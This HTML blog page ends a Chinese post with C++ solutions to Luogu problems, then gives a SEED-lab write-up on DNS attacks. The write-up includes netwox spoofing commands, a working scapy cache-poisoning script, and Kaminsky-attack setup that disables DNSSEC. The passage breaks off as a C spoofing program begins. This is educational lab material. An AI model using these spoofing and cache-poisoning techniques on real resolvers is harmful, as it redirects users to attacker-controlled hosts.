class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">13</span>; i++)<span class="comment">//计算日子</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; m1)<span class="comment">//对于第一个日期多退</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">leap</span>(y1))</span><br><span class="line">            &#123;</span><br><span class="line">                sum -= days_leap[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sum -= days[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; m2)<span class="comment">//对于第二个日期少补</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">leap</span>(y2))</span><br><span class="line">            &#123;</span><br><span class="line">                sum += days_leap[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sum += days[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= m1 &amp;&amp; i &gt;= m2)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> day1 = d1.day, day2 = d2.day;<span class="comment">//对日多退少补</span></span><br><span class="line">    sum -= (day1<span class="number">-1</span>);<span class="comment">//注意日期中的日还没有过完，故先-1</span></span><br><span class="line">    sum += (day2<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着将日期转换成分钟，并同样对小时分钟进行多退少补即可。</p>
+<p>2.求最多可以做的题数，根据贪心算法，先做耗时少的题显然可以做更多题目，于是将ti按照从小到大排序即可。需要注意的是，两个日期之间的总时间totaltime有可能大于N道题花的总时间，因此仅仅根据totaltime小于零来判断题数是不对的。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(questions,questions+N);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; totaltime &gt;= <span class="number">0</span> &amp;&amp; i &lt; N;i++)</span><br><span class="line">&#123;</span><br><span class="line">    totaltime -= questions[i];<span class="comment">//如果没有i&lt;N,在questions都做完了totaltime还有剩余的时候就会数组越界(i&gt;=N)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == N &amp;&amp; totaltime &gt;= <span class="number">0</span>)<span class="comment">//注意要同时totaltime&gt;=0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,N);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>解法2:</strong></p>
+<p>在计算totaltime的时候，以0000年1月1日0时0分为基准，计算两个时间到基准的分钟数，再相减（注意开longlong），具体计算差不多，就是一个从0000年开始遍历，一个从最低年开始遍历，不再列代码。</p>
+<p><strong>p1190 接水问题</strong></p>
+<p>水房里有m个水龙头，n个同学按输入顺序接水，每个同学接水的时间wi逐行给出，一个同学接完则下个同学接，求所有同学接完水的最短时间。</p>
+<p><strong>解法：</strong></p>
+<p>这题由于节水顺序给定直接模拟即可，接水耗时最短的同学最先离开由下一位同学接替，因此每次只需要求出m位接水的同学中耗时最短的同学（即<strong>最小堆</strong>）。比较简单的做法是将下一位接替的同学的时间加到第一个打完水（时间最小）的同学上，（这样就不必打完水减少时间为0，其余所有打水的同学都要减少）这样知道最后一个同学加完，m个接水的同学中时间最大的就是所有人接完水的时间。</p>
+<p>使用长m的优先队列实现，每次pop出最小的并加上下一位同学，再将加完的值重新push入优先队列，全部加完后最大的值（pop m-1个剩下的就是最大的）就是答案。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; q;<span class="comment">//注意greater代表最小堆</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line">	q.<span class="built_in">push</span>(w[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = m; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> k = q.<span class="built_in">top</span>() + w[i];</span><br><span class="line">	q.<span class="built_in">pop</span>();</span><br><span class="line">	q.<span class="built_in">push</span>(k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	q.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,q.<span class="built_in">top</span>());</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/27/%E6%B4%9B%E8%B0%B7/" data-id="ckr5o9zze002fxkur81okad2r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-DNS攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/23/DNS%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-04-23T06:32:43.000Z" itemprop="datePublished">2021-04-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/23/DNS%E6%94%BB%E5%87%BB/">DNS攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>原理：</strong></p>
+<p>DNS用于查询域名对应的IP，域名系统是一个分布式的数据库系统，包括根域名服务器、顶级域（TLD）服务器、权威DNS服务器，本地DNS服务器（在网卡中设置的DNS服务器，作为DNS代理）</p>
+<p>用户把DNS查询请求发给本地DNS服务器（当浏览器缓存、操作系统缓存、本地hosts文件都没有找到），DNS服务器先找自己的缓存中有没有对应的IP，没有的话就向根域名服务器查询（有迭代查询和递归查询），再依次查询子域名（例如<code>www.baidu.com</code>,<code>com.</code>是根域名，根域名服务器会查询.com域名<code>baidu.com.</code>是其子域名等）</p>
+<p><strong>前置准备：</strong>使用Ubuntu seed作为实验环境，两个docker容器分别作为本地dns server和user，ip分别为172.17.0.2，172.17.0.3，攻击主机ip为172.17.0.1。设置user的/etc/resolv.conf，将server的ip作为第一个nameserver条目，即将此服务器作为主DNS服务器。如图</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%AE%BE%E7%BD%AE1.png"></p>
+<p>在服务器中运行DNS服务，我们选择BIND 9服务器程序。设置好后启动dns服务，使用命令：<code> sudo service bind9 restart</code>.</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%AE%BE%E7%BD%AE2.png"></p>
+<p>接着在user <code>ping www.google.com</code>，在攻击机上使用wireshark抓docker0的包，如图所示，第一个dns查询报文指向server的ip 172.17.0.2。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%AE%BE%E7%BD%AE3.png"></p>
+<p><strong>配置DNS服务器：</strong>bind9从/etc/bind/named.conf文件中获取其配置，这个文件中会包含几个include选项，配置文件包含在include文件中。其中一个include文件/etc/bind/named.conf.options，我们向其中添加dump-file条目来设置与DNS缓存有关的选项，如果要求bind转储其缓存，则options指定应转储缓存内容的位置；如果未指定位置，则会将缓存转储到名为/var/cache/bind/named_dump.db的默认文件中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">options&#123;</span><br><span class="line">	dump-file <span class="string">&quot;/var/cache/bind/dump.db&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面两个命令和DNS缓存有关，第一个把缓存的内容转储到上面指定的文件；第二个命令清空缓存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo rndc dumpdb -cache</span><br><span class="line">$sudo rndc flush</span><br></pre></td></tr></table></figure>
+
+<p>到/etc/bind/named.conf.options里面注释掉dnssec-validation条目，添加dnssec-enable条目</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">options&#123;</span><br><span class="line">	<span class="meta">#dnssec-validation auto;</span></span><br><span class="line">	dnssec-enable no;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>在server的本地DNS服务器创建一个区域</strong>：假设server有一个域名example.com。首先在server的/etc/bind/named.conf中添加两个区域条目，一个用于从域名到ip的映射，一个用于ip到域名的映射。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">&quot;example.com&quot;</span> &#123;</span><br><span class="line">type master;</span><br><span class="line">file <span class="string">&quot;/etc/bind/example.com.db&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone <span class="string">&quot;0.168.192.in-addr.arpa&quot;</span> &#123;</span><br><span class="line">type master;</span><br><span class="line">file <span class="string">&quot;/etc/bind/192.168.0.db&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>将本地的example.com.db存入server的/etc/bind/目录下，使用命令:<code>docker cp /home/seed/files/expiriment2/example.com.db 5055b5fc0904:/etc/bind/example.com.db</code>（注意cp的时候用root才能进入docker，但是此时会导致db文件没有读权限，要修改两个db文件的权限）</p>
+<p>同样将192.168.0.db存入/etc/bind目录中。</p>
+<p>最后重新启动BIND9，用客户机使用命令<code>dig www.example.com</code>向本地DNS服务器查询IP，结果如图所示，其中question section代表DNS查询的内容，查询<code>www.example.com</code>，查询的信息是internet协议（ip协议），A代表是ipv4；answer section代表DNS应答信息，259200代表服务器对该记录的缓存秒数；下面的NS代表后面是DNS服务器。</p>
+<blockquote>
+<p>dig信息详细介绍参见如下博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/charleslei/article/details/51226741">https://blog.csdn.net/charleslei/article/details/51226741</a></p>
+</blockquote>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%AE%BE%E7%BD%AE4.png"></p>
+<p>我们对example.net的查询进行攻击。</p>
+<h3 id="DNS本地攻击"><a href="#DNS本地攻击" class="headerlink" title="DNS本地攻击"></a>DNS本地攻击</h3><p>以下都是对本地DNS服务器进行攻击，攻击者可以监听user本地的报文。</p>
+<ol>
+<li><p><strong>netwox攻击用户主机</strong></p>
+<p>使用netwox 105工具，该工具的帮助如图：</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B01.png"></p>
+<p>使用命令<code>netwox 105 -h &quot;www.google.com&quot; -H &quot;123.123.123.13&quot; -a &quot;ns.google.com&quot; -A &quot;122.133.123.12&quot; -f &quot;src host 172.17.0.3&quot; -d docker0 -T 10</code>，该命令的意思是，嗅探由f过滤的DNS 请求包，如果嗅探到了就发送DNS响应包，响应包将<code>www.google.com</code>的ip解释为123.123.123.13并假装权威DNS服务器122.133.123.12发送给172.17.0.3 user。</p>
+<p>user使<code>dig www.google.com</code>发送DNS查询信息，得到的结果如下，果然<code>www.google.com</code>被解释成了虚假的的ip：123.123.123.13</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B02.png"></p>
+</li>
+<li><p><strong>netwox攻击服务器缓存（缓存中毒攻击）</strong></p>
+<p>首先清空服务器的缓存，使用命令<code>sudo rndc flush</code>.使用netwox命令<code>sudo netwox 105 -h &quot;www.google.com&quot; -H &quot;123.123.123.13&quot; -a &quot;ns.google.com&quot; -A &quot;1.2.3.4&quot; -d ens33 -T 600 -s raw</code>，注意此时在这里并不选择过滤，网卡也不选择docker0，因为服务器会像外界发送DNS查询，那么就用外界通信的网卡ens33。</p>
+<p>可以看到server的缓存成功存入了我们发送的响应包内容，user查询得到的结果也是我们预设的结果。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B03.png"></p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B04.png"></p>
+</li>
+<li><p><strong>scapy进行DNS缓存中毒攻击</strong></p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">local_dns_srv = <span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_dns</span>(<span class="params">pkt</span>):</span></span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.google.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">   old_ip = pkt[IP]</span><br><span class="line">   old_udp = pkt[UDP]</span><br><span class="line">   old_dns = pkt[DNS]</span><br><span class="line">   ip=IP(dst = old_ip.src,src = old_ip.dst)</span><br><span class="line">   udp=UDP(dport = old_udp.sport,sport = <span class="number">53</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">#The answer section</span></span><br><span class="line">   Anssec = DNSRR(rrname = old_dns.qd.qname,<span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,rdata = <span class="string">&#x27;123.123.123.13&#x27;</span>,ttl = <span class="number">260000</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">#The authority section  </span></span><br><span class="line">   NSsec1 = DNSRR(rrname = <span class="string">&#x27;google.net&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = <span class="string">&#x27;ns1.google.net&#x27;</span>, ttl = <span class="number">260000</span>)</span><br><span class="line">   NSsec2 = DNSRR(rrname = <span class="string">&#x27;google.net&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = <span class="string">&#x27;ns2.google.net&#x27;</span>, ttl = <span class="number">260000</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#The additional section</span></span><br><span class="line">Addsec1 = DNSRR(rrname = <span class="string">&#x27;ns1.google.net&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>, ttl = <span class="number">260000</span>)</span><br><span class="line">   Addsec2 = DNSRR(rrname = <span class="string">&#x27;ns2.google.net&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;5.6.7.8&#x27;</span>, ttl = <span class="number">260000</span>)</span><br><span class="line"></span><br><span class="line">   dns = DNS(<span class="built_in">id</span> = old_dns.<span class="built_in">id</span>,aa = <span class="number">1</span>,rd = <span class="number">0</span>,qr = <span class="number">1</span>,qdcount = <span class="number">1</span>,ancount = <span class="number">1</span>,nscount = <span class="number">2</span>,arcount = <span class="number">2</span>,qd = old_dns.qd, an = Anssec, ns = NSsec1/NSsec2, ar = Addsec1/Addsec2)</span><br><span class="line">   spoofpkt = ip/udp/dns</span><br><span class="line">   send(spoofpkt)</span><br><span class="line">f = <span class="string">&#x27;udp and (src host &#123;&#125; and dst port 53)&#x27;</span>.<span class="built_in">format</span>(local_dns_srv)</span><br><span class="line">sniff(<span class="built_in">filter</span>=f,prn=spoof_dns,iface = <span class="string">&quot;docker0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机执行以上代码，user进行<code>www.google.com</code>的DNS查询，可以看到server的缓存已经被成功更改，并且user查询出来的结果也变成了篡改后的结果。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B05.png"></p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E6%9C%AC%E5%9C%B06.png"></p>
+</li>
+</ol>
+<h3 id="DNS远程攻击"><a href="#DNS远程攻击" class="headerlink" title="DNS远程攻击"></a>DNS远程攻击</h3><p>当本地DNS服务器和攻击者主机不在同一个域中，攻击者无法对DNS请求包进行嗅探，此时需要远程攻击的方法。</p>
+<p>如图所示，当发出一个DNS请求，本地DNS服务器会从根域名服务器开始迭代查询，当最后得到<code>www.example.com</code>的ip时（7），我们伪造该包并抢先在权威服务器之前发送伪造的数据包，改变ip地址和权威DNS服务器的地址（主要要把权威服务器的地址改成攻击者的地址）。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B1.png"></p>
+<p>由于无法嗅探得到事务id和本地DNS服务器的发送端口号，我们采用暴力枚举的方法。简便起见，假定本地DNS服务器的发送端口号固定为33333，我们只需枚举出事务id即可。而仅仅对一个DNS查询进行枚举事务id、伪造数据包，不一定能赶在真正的数据包达到之前发送成功，倘若本地DNS服务器接收了真正的数据包，它将把结果缓存一段时间，此时攻击者再次发起查询DNS服务器将在缓存中找到结果而非查example.comDNS服务器，也就没办法发起下一次欺骗。因此采用Kaminsky攻击：发送多个DNS查询请求，如<code>dig www.example.com</code> <code>dig aaa.example.com</code>，尽管有些域名可能没用意义，但是只要成功就可以修改本地DNS服务器中 权威服务器的ip地址<code>ns.example.com</code>为攻击者的DNS服务器的地址，这时攻击者就取代了example.com权威服务器.</p>
+<h4 id="前置准备："><a href="#前置准备：" class="headerlink" title="前置准备："></a>前置准备：</h4><p><strong>对攻击机进行配置：</strong></p>
+<ol>
+<li><p>首先需要将攻击机的本地DNS服务器设置为server，因为攻击机发送查询报文的时候是向server发送的。在攻击机中使用命令<code>vi /etc/resolv.conf</code> 将nameserver 172.17.0.2放在最前面，如图所示，在攻击机中<code>ping www.baidu.com</code>使用wireshark抓包查看是否dns报文是否由172.17.0.1(攻击机)发给172.17.0.2(server)</p>
+<p> <img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B2.png"></p>
+<p> 在ubuntu中，/etc/resolv.conf可能被DHCP客户端更改，所以需要将DHCP关闭，在/etc/resolvconf/resolv.conf.d/head文件中添加nameserver 172.17.0.2，执行命令<code>sudo resolvconf -u</code>完成设置。</p>
+</li>
+<li><p>配置攻击机的DNS服务，在攻击机的/etc/bind/named.conf.local中添加如下代码，如图所示：</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">&quot;example.com&quot;</span>&#123;</span><br><span class="line">        type master;</span><br><span class="line">        file <span class="string">&quot;/etc/bind/example.com.zone&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B3.png"></p>
+<p> 接着创建文件/etc/bind/example.com.zone，用以下代码填充，如图所示：</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$TTL <span class="number">3</span>D</span><br><span class="line">@                IN      SOA     ns.example.com. admin.example.com. (</span><br><span class="line">                         <span class="number">2008111001</span></span><br><span class="line">                         <span class="number">8</span>H</span><br><span class="line">                         <span class="number">2</span>H</span><br><span class="line">                         <span class="number">4</span>W</span><br><span class="line">                         <span class="number">1</span>D)</span><br><span class="line"></span><br><span class="line">@                IN      NS      ns.iamen.net.</span><br><span class="line"></span><br><span class="line">www              IN      A       <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">mail             IN      A       <span class="number">1.1</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line">*.example.net    IN      A       <span class="number">1.1</span><span class="number">.1</span><span class="number">.100</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> <img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B4.png"></p>
+<p> 此时攻击机的DNS服务已经可以响应对example.com的查询了，当伪造报文将server的DNS服务器引导到攻击机上时，它就可以做出响应，并把ns设置为huyiman.net</p>
+</li>
+<li><p>设置server的dns服务</p>
+<p> 在远程攻击实验中，server作为用户的本地DNS服务器，而非分管example.com的权威服务器，攻击者在攻击针对example.com的查询时，这个查询是对真实世界中的example.com的查询，而非server中配置的，因此我们需要将server中example.com区域注释掉（在/etc/bind/named.conf中）</p>
+<p> 此外还需要将dns查询端口号固定为33333，便于攻击。在/etc/bind/named.conf.options中添加<code>query-source port 33333</code>即可。</p>
+<p> 我们还需要关闭DNS服务的DNSSEC功能，DNSSEC可以抵抗缓存中毒攻击。在/etc/bind/named.conf.options注释掉<code>dnssec-validation auto</code>行即可。如图所示：</p>
+<p> <img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B5.png"></p>
+<p> 在攻击机的配置中，我们添加了huyiman.net，然而这样不存在的域名并不会被server的DNS服务所认可，因此我们需要进行设置。在/etc/bind/named.conf.default-zones文件中添加如下代码：</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">&quot;ns.huyiman.net&quot;</span>&#123;</span><br><span class="line">    type master;</span><br><span class="line">    file <span class="string">&quot;/etc/bind/db.attacker&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p> 接着创建文件/etc/bind/db.attacker，将如下代码加入其中，设置ns.huyiman.net对应的ip是172.17.0.1</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">; BIND data file <span class="keyword">for</span> local loopback interface</span><br><span class="line">;</span><br><span class="line">$TTL	<span class="number">604800</span></span><br><span class="line">@	IN	SOA	localhost. root.localhost. (</span><br><span class="line">			      <span class="number">2</span>		; Serial</span><br><span class="line">			 <span class="number">604800</span>		; Refresh</span><br><span class="line">			  <span class="number">86400</span>		; Retry</span><br><span class="line">			<span class="number">2419200</span>		; Expire</span><br><span class="line">			 <span class="number">604800</span> )	; Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@	IN	NS	ns.huyiman.net.</span><br><span class="line">@	IN	A	<span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">@	IN	AAAA	::<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>全部设置完成后，重启server和攻击机的DNS服务。</p>
+<h4 id="远程DNS缓存中毒攻击"><a href="#远程DNS缓存中毒攻击" class="headerlink" title="远程DNS缓存中毒攻击"></a>远程DNS缓存中毒攻击</h4><p>因为C语言更接近底层，能够更快地完成发送，因此我们使用C语言完成攻击。</p>
+<p>在攻击机<code>dig www.example.com</code>，查看<code>www.example.com</code>真正的权威DNS服务器ip为199.43.135.53和199.43.133.53，如图所示：</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B7.png"></p>
+<p>使用199.43.133.53作为我们伪造响应报文的源ip，编写udp.h和udp.c代码，构造查询报文和响应报文，并且修改id和查询域名，不断发送查询报文和相应的响应报文。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span 